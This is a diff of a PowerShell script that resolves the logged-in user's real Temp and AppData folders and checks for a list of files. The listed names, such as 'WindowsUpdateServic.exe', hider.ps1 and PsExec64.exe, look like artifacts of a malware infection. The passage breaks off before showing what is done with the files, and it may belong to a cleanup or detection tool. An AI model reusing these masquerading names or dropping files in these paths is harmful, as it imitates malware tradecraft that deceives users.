@@ -1,13 +1,24 @@
+$LoggedInUser = (Get-CimInstance Win32_ComputerSystem).UserName
+if ($LoggedInUser -and $LoggedInUser.Contains("\")) {
+    $UserName = $LoggedInUser.Split("\")[1]
+    $UserFolder = "C:\Users\$UserName"
+} else {
+    $UserName = (Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -First 1).IncludeUserName
+    if ($UserName -and $UserName.Contains("\")) { $UserName = $UserName.Split("\")[1] }
+    else { $UserName = [Environment]::UserName } # Yedek plan
+    $UserFolder = "C:\Users\$UserName"
+}
+$RealTemp = Join-Path $UserFolder "AppData\Local\Temp"
+$RealAppData = Join-Path $UserFolder "AppData\Roaming"
 $filePaths = @(
-    (Join-Path $env:TEMP "syshealth.pyw"),
-    (Join-Path $env:TEMP "PsExec64.exe"),
-    (Join-Path $env:TEMP "WindowsUpdateServic.exe"),
-    (Join-Path $env:TEMP "rights.ps1"),
-    (Join-Path $env:TEMP "hider.ps1"),
-    (Join-Path $env:TEMP "first.exe"),
-    (Join-Path $env:APPDATA "WinHCheck.exe")
+    (Join-Path $RealTemp "syshealth.pyw"),
+    (Join-Path $RealTemp "PsExec64.exe"),
+    (Join-Path $RealTemp "WindowsUpdateServic.exe"),
+    (Join-Path $RealTemp "rights.ps1"),
+    (Join-Path $RealTemp "hider.ps1"),
+    (Join-Path $RealTemp "first.exe"),
+    (Join-Path $RealAppData "WinHCheck.exe")
 )
-
 foreach ($filePath in $filePaths) {
     if (-not (Test-Path $filePath)) {
         continue
